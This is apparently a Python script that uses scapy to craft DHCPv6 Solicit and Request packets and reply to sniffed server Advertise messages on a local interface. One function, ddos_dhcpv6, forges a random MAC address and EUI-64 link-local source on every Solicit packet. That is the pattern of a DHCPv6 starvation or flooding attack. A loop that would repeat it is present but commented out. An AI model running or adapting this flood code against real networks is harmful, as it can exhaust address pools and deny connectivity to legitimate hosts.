from scapy.all import *
from Get_MAC import *
import random
import os
import re


def get_linklocal(iface):
    data = os.popen("ifconfig " + iface + "| grep fe80").read()
    linklocal = re.search(r".*inet6\s*(.*)%", data).group(1)
    return linklocal


class randmac():
    """ Generates two forms of random MAC address
    and corresponding Link Local EUI-64 IPv6 address"""

    def __init__(self):
        """
        Generates MAC address string by chunks of one byte
        """
        random.seed()
        self.mac11 = str(hex(random.randint(0, 255))[2:])
        self.mac12 = str(hex(random.randint(0, 255))[2:])
        self.mac21 = str(hex(random.randint(0, 255))[2:])
        self.mac22 = str(hex(random.randint(0, 255))[2:])
        self.mac31 = str(hex(random.randint(0, 255))[2:])
        self.mac32 = str(hex(random.randint(0, 255))[2:])


    def form1b(self):
        """ format 1 XX:XX:XX:XX:XX:XX"""
        self.rez1 = self.mac11 + ":" + self.mac12 + ":" + self.mac21 + ":" + self.mac22 + ":" + self.mac31 + ":" + self.mac32
        return self.rez1


    def form2b(self):
        """ format 2 XXXX.XXXX.XXXX"""
        self.rez2 = self.mac11 + self.mac12 + "." + self.mac21 + self.mac22 + "." + self.mac31 + self.mac32
        return self.rez2


    def eui64(self):
        """ Generates interface ID in EUI-64 format"""
        self.rez3 = self.mac11 + self.mac12 + ":" + self.mac21 + "ff" + ":" + "fe" + self.mac22 + ":" + self.mac31 + self.mac32
        return self.rez3


    def ip6_ll_eui64(self):
        """ Generates Link-local  IPv6 addres in EUI-64 format"""
        self.ipv6_ll_eui64 = "fe80" + "::" + self.eui64()
        return self.ipv6_ll_eui64


def solicit(ifname):
    ethernet = Ether(dst='33:33:00:01:00:02', src=ll_mac, type=0x86dd)
    ip = IPv6(src=linklocal, dst='ff02::1:2')
    udp =UDP(sport=546, dport=547)
    dhcpv6 = DHCP6_Solicit(trid=trid)
    cid = DHCP6OptClientId(optlen=14)
    duid = DUID_LLT(lladdr=ll_mac)
    iana = DHCP6OptIA_NA(iaid=iaid, T1=0, T2=0)
    option_request = DHCP6OptOptReq(reqopts=[24, 23, 17, 39])
    packet = ethernet/ip/udp/dhcpv6/cid/duid/iana/option_request
    sendp(packet, iface=ifname)


def ddos_dhcpv6(ifname):
    macs = randmac()
    macsrc = macs.form1b()
    ipv6llsrc = macs.ip6_ll_eui64()
    trid = random.randint(0, 1444000)
    iaid = random.randint(0, 1444000)
    ethernet = Ether(dst='33:33:00:01:00:02', src=macsrc, type=0x86dd)
    ip = IPv6(src=ipv6llsrc, dst='ff02::1:2')
    udp = UDP(sport=546, dport=547)
    dhcpv6 = DHCP6_Solicit(trid=trid)
    cid = DHCP6OptClientId(optlen=14)
    duid = DUID_LLT(lladdr=macsrc)
    iana = DHCP6OptIA_NA(iaid=iaid, T1=0, T2=0)
    option_request = DHCP6OptOptReq(reqopts=[24, 23, 17, 39])
    packet = ethernet / ip / udp / dhcpv6 / cid / duid / iana / option_request
    sendp(packet, iface=ifname)


def dhcpv6_serverid(pkt):
    optlen = pkt.getlayer("DHCP6 Server Identifier Option").optlen
    serverid = DHCP6OptServerId(duid=pkt.getlayer("DHCP6 Server Identifier Option").duid, optlen=optlen)
    return serverid


def dhcpv6_iana(pkt):
    T1 = pkt.getlayer("DHCP6 Identity Association for Non-temporary Addresses Option").T1
    T2 = pkt.getlayer("DHCP6 Identity Association for Non-temporary Addresses Option").T2
    iaid = pkt.getlayer("DHCP6 Identity Association for Non-temporary Addresses Option").iaid
    optlen = pkt.getlayer("DHCP6 Identity Association for Non-temporary Addresses Option").optlen
    ianaopts = pkt.getlayer("DHCP6 Identity Association for Non-temporary Addresses Option").ianaopts
    iana = DHCP6OptIA_NA(optlen=optlen, T1=T1, T2=T2, ianaopts=ianaopts, iaid=iaid)
    return iana


def dhcpv6_clientid(pkt):
    clientduid = pkt.getlayer("DHCP6 Client Identifier Option").duid
    clientid = DHCP6OptClientId(optlen=14, duid=clientduid)
    return clientid


def dhcpv6_request(pkt):
    ethernet = Ether(dst='33:33:00:01:00:02', src=ll_mac, type=0x86dd)
    ip = IPv6(src=linklocal, dst='ff02::1:2')
    udp = UDP(sport=546, dport=547)
    dhcpv6 = DHCP6_Request(trid=trid)
    serverid = dhcpv6_serverid(pkt)
    iana = dhcpv6_iana(pkt)
    clientid = dhcpv6_clientid(pkt)
    option_request = DHCP6OptOptReq(reqopts=[24, 23, 17, 39])
    packet = ethernet / ip / udp / dhcpv6 / clientid / serverid / iana / option_request
    sendp(packet, iface="en0")


def dhcpv6_request_only(pkt):
    try:
        if pkt.haslayer("ICMPv6 Destination Unreachable"):
            raise SyntaxError
        if pkt.haslayer("DHCPv6 Advertise Message"):
            if pkt.getlayer("DHCPv6 Advertise Message").msgtype == 2:
                dhcpv6_request(pkt)
    except Exception as e:
        pass


def dhcpv6_full(ifname):
    global ll_mac
    global trid
    global iaid
    ll_mac = GET_MAC(ifname)
    trid = random.randint(0, 1444000)
    iaid = random.randint(0, 1444000)
    solicit(ifname=ifname)
    sniff(prn=dhcpv6_request_only, filter='port 546 and port 547', store=0, timeout=10)


if __name__ == "__main__":
    global linklocal
    linklocal = get_linklocal("en0")
    print(linklocal)
    dhcpv6_full("en0")
    # while 1:
    #     ddos_dhcpv6("en0")
    #     time.sleep(1)